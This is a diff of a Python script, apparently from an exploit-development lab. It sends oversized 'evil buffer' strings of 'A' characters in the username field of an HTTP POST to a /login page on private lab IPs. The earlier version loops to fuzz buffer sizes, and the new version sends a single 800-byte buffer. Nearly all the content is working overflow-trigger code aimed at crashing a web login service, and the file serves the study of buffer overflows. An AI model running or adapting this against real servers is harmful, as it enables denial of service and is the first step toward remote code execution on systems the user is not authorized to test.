@@ -6,43 +6,43 @@ import sys
 IP = "127.0.0.1"
 PORT = 80
 
-size = 100
-
-while (size < 2000):
-    try:
-        print(f"\nSending evil buffer with {size} bytes, ")
-
-        inputBuffer = "A"*size
-
-        content = "username=" + inputBuffer + "&password=A"
-
-        buffer = "POST /login HTTP/1.1\r\n"
-        buffer += "Host: 192.168.121.10\r\n"
-        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
-        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
-        buffer += "Referer: http://10.11.0.22/login\r\n"
-        buffer += "Connection: close\r\n"
-        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
-        buffer += "Content-Length: " + str(len(content)) + "\r\n"
-        buffer += "\r\n"
+size = 800
 
 
-        buffer += content
+try:
+    print(f"\nSending evil buffer with {size} bytes, ")
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    inputBuffer = "A"*size
 
-        s.connect(("192.168.121.10", 80))
+    content = "username=" + inputBuffer + "&password=A"
 
-        s.send(buffer.encode("ascii"))
+    buffer = "POST /login HTTP/1.1\r\n"
+    buffer += "Host: 192.168.121.10\r\n"
+    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+    buffer += "Referer: http://10.11.0.22/login\r\n"
+    buffer += "Connection: close\r\n"
+    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+    buffer += "Content-Length: " + str(len(content)) + "\r\n"
+    buffer += "\r\n"
 
-        s.close()
 
-        size += 100
-        time.sleep(10)
+    buffer += content
 
-        print("Done")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    except:
-        print("Could not connect")
-        sys.exit()
+    s.connect(("192.168.175.10", 80))
+
+    s.send(buffer.encode("ascii"))
+
+    s.close()
+
+    size += 100
+    time.sleep(10)
+
+    print("Done")
+
+except:
+    print("Could not connect")
+    sys.exit()
